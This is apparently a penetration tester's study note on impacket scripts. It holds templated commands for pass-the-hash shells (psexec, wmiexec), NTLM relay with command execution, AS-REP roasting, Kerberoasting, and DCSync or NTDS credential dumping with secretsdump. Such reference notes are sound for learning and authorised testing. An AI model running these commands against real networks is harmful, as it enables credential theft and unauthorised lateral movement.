---
tags:
  - "#type/tool"
  - "#attack/lateral-movement"
  - "#attack/execution"
Link: https://www.kali.org/tools/impacket-scripts/
Purpose: python-based networking multitool
---
# Info

impacket is a python module that supports networking tasks

- makes working with network protocols in python easier
- supports both low level (IP, UDP, TCP) and high level (NMB, SMB) protocols
- Contains lots of modules for different protocols

**impacket-scripts** contains many for various purposes

# Impacket-mssqlclient

**Purpose:** connect to a [[2 Tech-Specifics/Database/MSSQL|MSSQL]] database.

**Usage:**`username:password@<address>`

Use NTLM auth instead of kerberos: `-windows-auth`

# Impacket-psexec

Emulates the behaviour of [[3 Tools/microsoft/Sysinternals#PsExec|PsExec]].

**Purpose:** [[2 Tech-Specifics/OS/Windows/Lateral Movement/Pass the Hash|Pass the Hash]] - (provides a shell with **SYSTEM** privileges.)

**Usage:** `impacket-psexec -hashes <LM_hash>:<NTLM_hash> <user>@<IP>`

**Note:** If no LM hash is available, fill it with 32 zeros: `00000000000000000000000000000000`

# Impacket-wmiexec

Uses [[2 Tech-Specifics/OS/Windows/WMI|WMI]] to execute commands on a remote system.

**Purpose:**
- [[2 Tech-Specifics/OS/Windows/Lateral Movement/Pass the Hash|Pass the Hash]]
- [[2 Tech-Specifics/Network/Protocols/TCP 135 msrpc|Initial Access]]

**Pass the hash:** `impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <user>@<IP>`

**Password Authentication:** `impacket-wmiexec [[domain/]username[:password]@]<targetName or address>`

**Note:** If no LM hash is available, fill it with 32 zeros.

# Impacket-ntlmrelayx

Relays NTLM authentication to another machine.

**Purpose:** [[2 Tech-Specifics/OS/Windows/Lateral Movement/NTLMv2 Relay Attack|NTLMv2 Relay Attack]]

**Example Usage:** `impacket-ntlmrelayx --no-http-server -smb2support -t <target-ip> -c "<command_to_execute>"`

# Impacket-GetNPUsers

typically used from kali, uses valid credentials to automatically identify vulnerable users and get TGTs for them

**Purpose:**
- [[2 Tech-Specifics/Network/Protocols/TCP,UDP 88 Kerberos#AS-REP Roasting|Kerberos AS-REP Roasting]]

**Example Usage:**`impacket-GetNPUsers -dc-ip <domain_controller_ip>  -request -outputfile <outfile> <domain>/<user>:<password>`

# Impacket-GetUserSPNs

typically used from kali, uses valid credentials to automatically identify vulnerable SPNs and get service tickets for them

**Purpose:**
- [[2 Tech-Specifics/Network/Protocols/TCP,UDP 88 Kerberos#Kerberoasting|Kerberoasting]]

**Example Usage:**`impacket-GetUserSPNs -request -dc-ip <domain_controller_ip> -outputfile <outfile> <domain>/<user>:<password>`

If the error `KRB_AP_ERR_SKEW(Clock skew too great)` is thrown, synchronize the local machines clock with the domain controller - e.g. use: [ntpdate](https://en.wikipedia.org/wiki/Ntpdate) or [rdate](https://en.wikipedia.org/wiki/Rdate)

# Impacket-secretsdump

**Purpose:**
- [[2 Tech-Specifics/Active Directory/Lateral Movement/dcsync|dcsync]]
- [[2 Tech-Specifics/OS/Windows/Shadow Copies#Credential Access & Persistence|Shadow Copies]]

**Example - dcsync attack:**

`impacket-secretsdump -just-dc-user <target_user> <domain>/<user>:<password>@<ip>`

**Example - extract secrets from shadow copy:**

`impacket-secretsdump -ntds <ntds_backup> -system <system_hive_backup> LOCAL`

Output format of impacket-secretsdump:

`<Username>:<RID>:<LM_hash>:<NT_hash>:...`
